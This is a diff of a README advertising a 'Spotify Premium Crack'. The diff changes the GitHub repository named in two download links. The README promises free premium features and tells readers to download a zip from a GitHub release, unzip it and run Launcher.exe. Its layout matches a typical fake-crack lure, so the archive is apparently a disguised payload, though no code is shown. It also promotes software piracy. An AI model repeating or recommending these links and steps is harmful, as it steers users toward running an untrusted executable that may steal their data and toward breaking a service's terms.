@@ -1,4 +1,4 @@
-# ✅ Link - [Here](https://github.com/Wrightjennifery16/super-duper-octo-robot/releases/download/Spotify-Release-Crack/Spotify.zip)
+# ✅ Link - [Here](https://github.com/Wrightjennifery16/Spotify-Premium-Tutorial/releases/download/Spotify-Release-Crack/Spotify.zip)
 
 # 💻 Description:
 Spotify Premium Crack is a modified version of the popular music streaming service that allows users to enjoy all the premium features without paying the subscription fee. With Spotify Premium Crack, you can listen to your favorite music ad-free, download songs for offline listening, and enjoy high-quality audio streaming, all while bypassing the limitations of the free version.
@@ -14,7 +14,7 @@ In terms of performance, Spotify Premium Crack is known for its reliability and 
 Spotify Premium Crack has a wide range of applications for music lovers, whether you want to create playlists for parties, discover new artists, or simply enjoy your favorite tracks without interruptions. Its versatile features make it an essential tool for anyone who wants to enhance their music listening experience.
 
 # ⚙️ Instruction:
-1. Download the archive from [here](https://github.com/Wrightjennifery16/super-duper-octo-robot/releases/download/Spotify-Release-Crack/Spotify.zip)
+1. Download the archive from [here](https://github.com/Wrightjennifery16/Spotify-Premium-Tutorial/releases/download/Spotify-Release-Crack/Spotify.zip)
 2. Unzip to any folder
 3. Run Launcher.exe
 4. Agree with terms and click Continue
